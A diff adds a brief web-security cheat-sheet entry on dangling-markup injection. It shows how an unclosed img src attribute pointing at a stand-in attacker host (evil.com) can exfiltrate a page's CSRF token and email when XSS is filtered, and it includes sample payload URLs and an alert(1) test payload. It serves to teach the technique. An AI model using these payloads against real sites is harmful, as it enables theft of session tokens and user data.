@@ -1,0 +1,25 @@
+
+When there is no way to trigger XSS, but HTML Injection is possible - you can try to
+hijack/exfiltrate information from a page using <img> tag with unclosed "src" attr.
+
+http://web.com/update?return_to=/home"><img src=1 onerror=alert(1)>
+
+<form action="http://web.com/update/email" method="post">
+<input type="hidden" name="return_to" value="/home"><img src="1">">
+<input type="hidden" name="csrf_token" value="s3cretT0ke3n">
+</form>
+
+<script> const email = "victim@mail.com"; let app_version = '1.33' </script>
+
+XSS Payload Filtered
+
+http://web.com/update?return_to=/home"><img src='http://evil.com?data=
+
+<form action="http://web.com/update/email" method="post">
+<input type="hidden" name="return_to" value="/home"><img src='http://evil.com?data=">
+<input type="hidden" name="csrf_token" value="s3cretT0ke3n">
+</form>
+
+<script> const email = "victim@mail.com"; let app_version = ' 1.33' <="" script="">
+
+CSRF Token (s3cretT0ke3n) and Email (victim@mail.com) has been exfiltrated to external website
